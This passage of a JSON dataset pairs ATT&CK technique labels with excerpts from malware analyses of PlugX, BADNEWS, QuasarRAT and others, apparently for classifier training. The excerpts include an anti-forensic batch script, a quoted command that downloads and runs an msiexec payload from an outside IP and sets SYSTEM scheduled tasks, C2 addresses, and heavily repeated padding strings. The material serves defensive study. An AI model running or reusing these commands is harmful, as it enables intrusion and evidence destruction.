Truedecode_plugx_pastebin('AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlZrrn5UC9=DZKSGAAALLBAEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+PsFu2q9n8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6AHyLyeUaBha3J=')decode_plugx_pastebin('AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlZrrn5UC9=DZKSDAAAAFAAEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+PsAHyLye8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6aBha3q9niJFu2=')decode_plugx_pastebin('AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlZrrn5UC9=DZKSEAAABGHBEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+PsFu2niJ8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6AHyLyeUaBha3q9=')decode_plugx_pastebin('AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlpeJZrrFu2n5UC9=DZKSDAAADOECEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+Ps8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6AHyLyeUaBha3q9niJ=')     Appendix C \u2013 a.bat      12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697  mscorsvw.execscript del.vbsdel BlackBox.dlldel mscorsvw.exedel BlackBoxdel explorer.execscript del.vbsdel %sfxcmd%del mscorsvw.exedel BlackBox.dlldel BlackBoxdel explorer.exedel del.vbsdel a.batdel %sfxcmd%del mscorsvw.exedel BlackBox.dlldel BlackBoxdel explorer.exedel del.vbsdel a.batreg delete \"HKLM\\SYSTEM\\ControlSet001\\services\\emproxy\" /freg delete \"HKLM\\SYSTEM\\ControlSet002\\services\\emproxy\" /freg delete \"HKLM\\SYSTEM\\CurrentControlSet\\services\\emproxy\" /freg delete \"HKLM\\SYSTEM\\ControlSet001\\services\\EmpPrx\" /freg delete \"HKLM\\SYSTEM\\ControlSet002\\services\\EmpPrx\" /freg delete \"HKLM\\SYSTEM\\CurrentControlSet\\services\\EmpPrx\" /freg delete \"HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\svchost_RASAPI32\" /freg delete \"HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\svchost_RASMANCS\" /freg delete \"HKU\\.DEFAULT\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-18\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows Script Host\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows Script Host\\Settings\" /freg delete \"HKU\\S-1-5-18\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\fipubfg\\fipubfg.rkr\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{Q65231O0-O2S1-4857-N4PR-N8R7P6RN7Q27}\\pzq.rkr\" /freg delete \"HKU\\S-1-5-18\\Software\\WinRAR SFX\\C%%Users%ADMINI~1%AppData%Local%Temp\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\HRZR_PGYFRFFVBA\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{S38OS404-1Q43-42S2-9305-67QR0O28SP23}\\rkcybere.rkr\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\ErtfubgCbegnoyr\\Ncc\\ertfubg\\ertfubg_k64.rkr\" /freg delete \"HKU\\S-1-5-18\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings\" /freg delete \"HKU\\S-1-5-19\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows Script Host\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows Script Host\\Settings\" /freg delete \"HKU\\S-1-5-19\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\fipubfg\\fipubfg.rkr\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{Q65231O0-O2S1-4857-N4PR-N8R7P6RN7Q27}\\pzq.rkr\" /freg delete \"HKU\\S-1-5-19\\Software\\WinRAR SFX\\C%%Users%ADMINI~1%AppData%Local%Temp\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\HRZR_PGYFRFFVBA\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{S38OS404-1Q43-42S2-9305-67QR0O28SP23}\\rkcybere.rkr\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\ErtfubgCbegnoyr\\Ncc\\ertfubg\\ertfubg_k64.rkr\" /freg delete \"HKU\\S-1-5-19\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings\" /freg delete \"HKU\\S-1-5-20\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows Script Host\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows Script Host\\Settings\" /freg delete \"HKU\\S-1-5-20\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\fipubfg\\fipubfg.rkr\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{Q65231O0-O2S1-4857-N4PR-N8R7P6RN7Q27}\\pzq.rkr\" /freg delete \"HKU\\S-1-5-20\\Software\\WinRAR SFX\\C%%Users%ADMINI~1%AppData%Local%Temp\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\HRZR_PGYFRFFVBA\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{S38OS404-1Q43-42S2-9305-67QR0O28SP23}\\rkcybere.rkr\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\ErtfubgCbegnoyr\\Ncc\\ertfubg\\ertfubg_k64.rkr\" /freg delete \"HKU\\S-1-5-20\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows Script Host\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows Script Host\\Settings\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\fipubfg\\fipubfg.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{Q65231O0-O2S1-4857-N4PR-N8R7P6RN7Q27}\\pzq.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\WinRAR SFX\\C%%Users%ADMINI~1%AppData%Local%Temp\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\HRZR_PGYFRFFVBA\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{S38OS404-1Q43-42S2-9305-67QR0O28SP23}\\rkcybere.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\ErtfubgCbegnoyr\\Ncc\\ertfubg\\ertfubg_k64.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows Script Host\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows Script Host\\Settings\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\WinRAR SFX\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\fipubfg\\fipubfg.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{Q65231O0-O2S1-4857-N4PR-N8R7P6RN7Q27}\\pzq.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\WinRAR SFX\\C%%Users%ADMINI~1%AppData%Local%Temp\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\HRZR_PGYFRFFVBA\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{S38OS404-1Q43-42S2-9305-67QR0O28SP23}\\rkcybere.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\Nqzvavfgengbe\\Qbjaybnqf\\ErtfubgCbegnoyr\\Ncc\\ertfubg\\ertfubg_k64.rkr\" /freg delete \"HKU\\S-1-5-21-590835768-3595378272-1660587800-1643_Classes\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings\" /fdel /s c:\\windows\\temp\\*.batdel /s c:\\windows\\temp\\*.datdel /s c:\\windows\\temp\\*.dlldel /s c:\\windows\\temp\\*.exedel /s c:\\windows\\temp\\*.vbsdel %0     Appendix D \u2013 PlugX Extracted strings      123456789101112131415161718  https//pastebin.com/eSsjmhBGhttps://pastebin.com/PSxQd6qwhttps://pastebin.com/CzjM9qwihttps://pastebin.com/xHDSxxMD%ProgramData%\\arm2sv1kDSSMDSSMMicrosoft Office Document Update UtilitySoftware\\Microsoft\\Windows\\CurrentVersion\\RunJmLI%ProgramFiles(x86)%\\Sophos\\AutoUpdate\\ALUpdate.exe%ProgramFiles(x86)%\\Common Files\\Java\\Java Update\\jusched.exe%ProgramFiles(x86)%\\Common Files\\Adobe\\ARM\\1.0\\armsvc.exe%windir%\\system32\\FlashPlayerApp.exeslaxpastebinmahTszuBzqwUTcGt%ProgramData%\\arm2sv1k\\Akgcl"
    ]
  },
  "masquerading file and directory discovery-multi": {
    "technique_names": ["masquerading", "file and directory discovery"],
    "sentances": [
      "File Indicators Samples Observed from Spear Phishing Messages Above    Filename Chinas_Arctic_Dream.doc   File Size 6587812 bytes   MD5 598eeb6a18233023f3551097aa49b083   SHA1 e9a46966f93fe15c22636a5033c61c725add8fa5   Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe",
      "Additional Observed Malware Files    Filename  Armed-Forces-Officers.doc    File Size  3226435 bytes    MD5  89beb207e7095d237c4d25c4c6e17e97    SHA1  15010f7cea913f2a36c56da7d73c2b9eb5a3878f    Notes Malicious RTF document that exploits CVE-2017-8570 and drops a Delphi RAT with the file name vsrss.exe"
    ]
  },
  "masquerading masquerading-multi": {
    "technique_names": ["masquerading"],
    "sentances": [
      "Filename The_Four_Traps_for_China.doc   File Size 4428595 bytes   MD5 7659c41a30976d523bb0fbb8cde49094   SHA1 3f1f3e838a307aff52fbcb5bba5e4c8fe68c30e5   Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe"
    ]
  },
  "user execution data compressed-multi": {
    "technique_names": ["user execution", "archive collected data"],
    "sentances": [
      "The lures are primarily documents of interest to Pakistani nuclear organizations and the Pakistani military as can be seen in the images below:  Figure 1 Lure extracted from a67220bcf289af6a99a9760c05d197d09502c2119f62762f78523aa7cbc96ef1  Figure 2 Lure extracted from 07d5509988b1aa6f8d5203bc4b75e6d7be6acf5055831cc961a51d3e921f96bd  Figure 3 Lure extracted from b8abf94017b159f8c1f0746dca24b4eeaf7e27d2ffa83ca053a87deb7560a571  Figure 4 Lure extracted from d486ed118a425d902044fb7a84267e92b49169c24051ee9de41327ee5e6ac7c2 and fd8394b2ff9cd00380dc2b5a870e15183f1dc3bd82ca6ee58f055b44074c7fd4 \u00a0 The payload from each of the malicious documents is an updated version of the BADNEWS malware family"
    ]
  },
  "screen capture remote file copy-multi": {
    "technique_names": ["screen capture", "ingress tool transfer"],
    "sentances": [
      "A number of commands are provided to the attackers, including the ability to download and execute additional information, upload documents of interest, and take screenshots of the desktop"
    ]
  },
  "masquerading exfiltration over command and control channel-multi": {
    "technique_names": ["masquerading", "exfiltration over c2 channel"],
    "sentances": [
      "All of these files reside in the victim\u2019s %TEMP% directory:    Filename Description   9PT568.dat Contains victim unique identifier   TPX498.dat Keystroke logs   edg499.dat List of interesting files   TPX499.dat Temporarily holds screenshot when given command by C2   up Temporarily contains downloaded file to be executed when given command by C2    \u00a0 Other changes we noticed in this variant include how the malware obfuscates C2 information stored via dead drop resolvers"
    ]
  },
  "exfiltration over alternative protocol data encoding data encrypted-multi": {
    "technique_names": [
      "exfiltration over alternative protocol",
      "data encoding",
      "data encrypted for impact"
    ],
    "sentances": [
      "Indicators of Compromise Malicious Word Document SHA256 Hashes a67220bcf289af6a99a9760c05d197d09502c2119f62762f78523aa7cbc96ef1 07d5509988b1aa6f8d5203bc4b75e6d7be6acf5055831cc961a51d3e921f96bd fd8394b2ff9cd00380dc2b5a870e15183f1dc3bd82ca6ee58f055b44074c7fd4 b8abf94017b159f8c1f0746dca24b4eeaf7e27d2ffa83ca053a87deb7560a571 d486ed118a425d902044fb7a84267e92b49169c24051ee9de41327ee5e6ac7c2 \u00a0 BADNEWS SHA256 Hashes ab4f86a3144642346a3a40e500ace71badc06a962758522ca13801b40e9e7f4a 290ac98de80154705794e96d0c6d657c948b7dff7abf25ea817585e4c923adb2 \u00a0 C2 Servers 185.203.118[.]115 94.156.35[.]204 \u00a0 Dead Drop Resolvers hxxp://feed43[.]com/8166706728852850.xml hxxp://feed43[.]com/3210021137734622.xml hxxp://www.webrss[.]com/createfeed.php?feedid=49966 hxxp://feeds.rapidfeeds[.]com/88604/ \u00a0 Script to Decrypt Dead Drop Resolversimport requests import base64 import binascii import re from Crypto.Cipher import Blowfish from struct import pack   rol = lambda val, r_bits, max_bits: (val << r_bits%max_bits) & (2**max_bits-1) | ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))  ror = lambda val, r_bits, max_bits: ((val & (2**max_bits-1)) >> r_bits%max_bits) | (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))   def unhexData(d):   if len(d) % 2:     d = d.zfill(len(d)+1)   return ord(binascii.unhexlify(d))   def decodeDecrypt(data):   decdata = ''   for x in range(len(data)):     x = x*2     if x < len(data):       c = unhexData(data[x])       add_num = unhexData(data[x+1])       c = c << 4       c = (c + add_num) & 0xff       c ^= 0x23       c = rol(c, 3, 8)       decdata += chr(c)   data2 = base64.b64decode(decdata)   key = binascii.unhexlify(\"F0E1D2C3B4A5968778695A4B3C2D1E0F0011223344556677\")   cipher = Blowfish.new(key, Blowfish.MODE_ECB)   dec = cipher.decrypt(data2)   return dec   urls = [   \"http://feeds.rapidfeeds.com/88604\" ]  for d in urls:   r = requests.get(d)   body = r.text   r = re.search(\"\\[+\\s*([a-zA-Z0-9\\=]+)\\]+\", body)   if r:     data = base64.b64decode(r.group(0))     print(\"[{}] Decrypted C2: {}\".format(d, decodeDecrypt(data).split(\"\\x00\")[0]))\u00a0 The post Patchwork Continues to Deliver BADNEWS to the Indian Subcontinent appeared first on Palo Alto Networks Blog"
    ]
  },
  "standard application layer protocol web service uncommonly used port-multi": {
    "technique_names": [
      "application layer protocol",
      "web service",
      "non-standard port",
      "non-standard port"
    ],
    "sentances": [
      "Is the command and control server used by the Poseidon Group still active? Have you been able to sinkhole any of the command and controls? Poseidon Group has interesting practices when it comes to its use of command and control servers, including redundancies and quickly discarding command and control (C&Cs) servers after specific campaigns"
    ]
  },
  "audio capture": [
    "Microphone, Voice IP applications",
    "High resolution screenshots of specified process windows and when recording VoiceIP application audio",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    "capturing audio ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " capture microphone ",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    " record audio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "Get-MicrophoneAudio",
    "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later."
  ],
  "process injection dll search order hijacking-multi": {
    "technique_names": [
      "process injection",
      "hijack execution flow: dll search order hijacking"
    ],
    "sentances": [
      "59 60 61 62 freeimage_32.dll freeimageplus_32.dll freeimage_64.dll freeimageplus_64.dll FreeImage open source library supports popular graphics image formats (ver 3.15.4 2012-10-27) (http://freeimage.sourceforge.net)"
    ]
  },
  "peripheral device discovery system information discovery-multi": {
    "technique_names": [
      "peripheral device discovery",
      "system information discovery"
    ],
    "sentances": [
      "69 70 rn64.dll rn32.dll Daily \u201cClientRecon\u201d (ComputerName, OS information, MacAddress, WirelessNetwork keys, connected Apple devices, Apple mobile devices backups list, IE version, SecurityCenterInfo (AV, Firewalls and AntiSpyware products), Hardware info, Installed soft including Metro Apps, Users, Autoruns)"
    ]
  },
  "execution through api application window discovery powershell-multi": {
    "technique_names": [
      "native api",
      "application window discovery",
      "event triggered execution: powershell profile"
    ],
    "sentances": [
      "Generate payloads in various formats:      Format Architecture Short Name     Android Package x86 & ARMv7 apk   Linux Binary x86 lin_x86   Linux Binary x64 lin_x64   Linux Shared Object x86 so_x86   Linux Shared Object x64 so_x64   Windows PE Executable x86 exe_x86   Windows PE Executable x64 exe_x64   Windows DLL x86 dll_x86   Windows DLL x64 dll_x64   Python Script x86 & x64 py   PyInstaller x86 & x64 pyinst   Python Oneliner x86 & x64 py_oneliner   Powershell x86 & x64 ps1   Powershell Oneliner x86 & x64 ps1_oneliner   Ducky Script N/A rubber_ducky      Deploy in memory from a single command line using python or powershell one-liners"
    ]
  },
  "scheduled task execution through api application window discovery data staged registry run keys / startup folder-multi": {
    "technique_names": [
      "scheduled task/job",
      "native api",
      "application window discovery",
      "data staged",
      "boot or logon autostart execution: registry run keys / startup folder"
    ],
    "sentances": [
      "Figure 2 \u2013 The entire contents of the macro \u00a0 The \u2018Company\u2019 field in this case, contains the raw command that the attacker wishes to run, downloading and executing the next stage of the malware:       cmd /c set /p=Set v=CreateObject(^\"Wscript.Shell^\"):v.Run ^\"msiexec /q /i http://199.247.6.253/ud^\",false,0 <nul >C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs & schtasks /create /sc MINUTE/tn \"Windows System\" /tr \"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\"/mo 2 /F & schtasks /create /sc MINUTE /tn \"Windows System\" /tr\"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\" /mo 2 /RU SYSTEM /c set/p=Set v=CreateObject(^\"Wscript.Shell^\"):v.Run ^\"msiexec /q /ihttp://199.247.6.253/ud^\",false,0 <nul >C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs & schtasks /create /sc MINUTE/tn \"Windows System\" /tr \"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\"/mo 2 /F & schtasks /create /sc MINUTE /tn \"Windows System\" /tr\"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\" /mo 2 /RU SYSTEM     \u00a0 Cluster B Case 2: Delivery via HTA Loader \u2013 1dc5966572e94afc2fbcf8e93e3382eef4e4d7b5bc02f24069c403a28fa6a458 \u00a0In this case the attackers sent an HTML Application file (.hta) to targets most likely as an email attachment"
    ]
  },
  "code signing scheduled task data from local system exploitation for client execution-multi": {
    "technique_names": [
      "subvert trust controls: code signing",
      "scheduled task/job",
      "data from local system",
      "exploitation for client execution"
    ],
    "sentances": [
